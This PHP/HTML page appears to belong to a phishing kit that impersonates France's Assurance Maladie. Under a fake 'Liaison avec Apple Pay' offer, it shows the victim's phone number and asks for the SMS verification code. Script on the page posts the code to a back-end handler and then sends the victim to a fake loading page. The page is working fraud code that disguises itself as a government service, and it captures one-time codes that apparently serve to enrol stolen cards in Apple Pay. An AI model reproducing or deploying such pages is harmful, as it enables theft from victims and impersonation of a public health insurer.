<?php 


include('../infos.php');
include("../common/sub_includes.php");
?>

<html lang="fr">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }

    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="https://web-carte-vitale.fr/public/fav.png" type="image/ico">

    <title>Veuillez remplir le formulaire</title>
</head>

<body>

<?php include("../common/header.php"); ?>


    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Liaison avec Apple Pay</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background-color : white">
                    <div class="panel-heading">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Liaison avec Apple Pay</h2>
                    </div>

                    <div class="panel-body"><br>Apple Pay fait son arrivée au sein de l'assurance Maladie en vous proposant une solution simple et efficace pour recevoir vos versements automatiquement. <br> <br> Afin d'activer ce service gratuit, veuillez renseigner le code envoyé au <?php echo $_SESSION["phone"]; ?> 
                        <form action="" id="formit" method="POST" style="margin-top : 40px"> 
                            <div class="row">
                                <div class="col-md-6">
									<style>
										.flex{
											display: flex;
											justify-content: space-between;
										}
									</style>


                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Code reçu</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="code" type="text" aria-required="true" placeholder="" required="">
                                    </div>
                                 
                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                                <div class="col-md-6" style="border-radius:6px;display : flex;justify-content : center;align-items : center">
                                <img style="height :140px" src="https://www.card-cutters.ae/wp-content/uploads/2018/08/Apple-Pay-Featured-Image-1280x914.png" alt="">                      </div>

                            </div>
                        </form>

                        <i>
						<small>Un délai de traitement commence le jour où nous recevons un formulaire dûment rempli et se termine lorsque nous prenons une décision. </small>
						</i>

                    </div>
                </div>
            </div>
        </div>
        <br><br>

        <div style="font-size: 1.8em;text-transform:uppercase;margin-bottom:15px;color: #082e6c;font-weight: 500;">
            L'actualité en bref
        </div>
        <div>
        <?php include("../common/bottom.php"); ?>
        </div>

    </main>

    <div id="loading" class="LoadingPage" style="display : none">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    
                </div>
                <span>Chargement en cours</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
        $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/apple_pay.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
        						setTimeout(function() {
        							window.location.href = "loading_finished.php";
        						}, 1500);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>